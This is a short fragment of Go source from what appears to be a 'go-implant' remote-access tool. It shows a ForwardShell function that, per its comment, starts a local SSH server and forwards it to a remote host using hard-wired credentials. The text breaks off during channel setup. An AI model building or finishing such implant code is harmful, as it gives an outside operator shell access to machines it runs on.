package ssh

import (
	"go-implant/client/config"
	"log"
)

// ForwardShell starts ssh server on localhost and redirects it to a remote host
func ForwardShell(channel chan struct{}, localsshport int, localsshusername string, localsshpassword string, remotesshusername string, remotesshpassword string, remotesshHost string, remotesshPort int, fromPort int) {

	// create new channel to indicate children to stop
	// does not get closed by children - this routine keeps running until channel gets closed
	newchan := make(chan struct{})

	// create new channel to pass port from ServeSSH to Forwardport
	portchan := make(cha